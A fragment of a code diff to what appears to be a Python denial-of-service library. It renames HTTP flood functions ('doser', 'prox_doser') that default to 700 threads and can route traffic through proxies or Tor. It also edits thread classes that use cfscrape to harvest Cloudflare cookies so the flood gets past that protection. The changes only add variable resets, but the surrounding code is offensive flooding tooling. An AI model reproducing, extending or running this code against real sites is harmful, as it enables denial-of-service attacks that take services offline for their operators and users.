-def doser_attack(u,threads=700,flood_method=1,timeout=5,duration=300,logs=True,returning=False,set_tor=False):
+  self.target=None
+  u=None
+  self.timeout=None
+  self.method=None
+  self.tor=None
+  host=None
+def doser(u,threads=700,flood_method=1,timeout=5,duration=300,logs=True,returning=False,set_tor=False):
  '''
   this function is for doser.py attack tool which uses requests module instead of httplib.
 '''
@@ -3974,7 +4013,12 @@ class prdose(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def prox_doser_attack(u,scraping_timeout=15,threads=700,http_list=None,flood_method=1,timeout=5,duration=300,logs=True,returning=False):
+  self.target=None
+  u=None
+  self.timeout=None
+  self.method=None
+  host=None
+def prox_doser(u,scraping_timeout=15,threads=700,http_list=None,flood_method=1,timeout=5,duration=300,logs=True,returning=False):
  '''
    this is the advanced version of doser.py using http proxies.
 '''
@@ -4085,13 +4129,15 @@ class atcf(threading.Thread):
        cf_doser_counter+=1
        if prints==True:
         print("Requests: {}".format(cf_doser_counter))
+  self.target=None
+  self.timeout=None
 class cooi(threading.Thread):
  def run(self):
   global ier
   global ual
   x=flag
   self.target=target
-  us=ue[flag]
+  us=ue[x]
   try:
    s = cfscrape.create_scraper()
    c = s.get_cookie_string("http://"+self.target,user_agent=us)
@@ -4099,6 +4145,9 @@ class cooi(threading.Thread):
    ual.append(us+':'+c)
   except:
    pass
+  self.target=None
+  us=None
+  x=None
   ier+=1
 def cki(logs=False):
  thr=[]
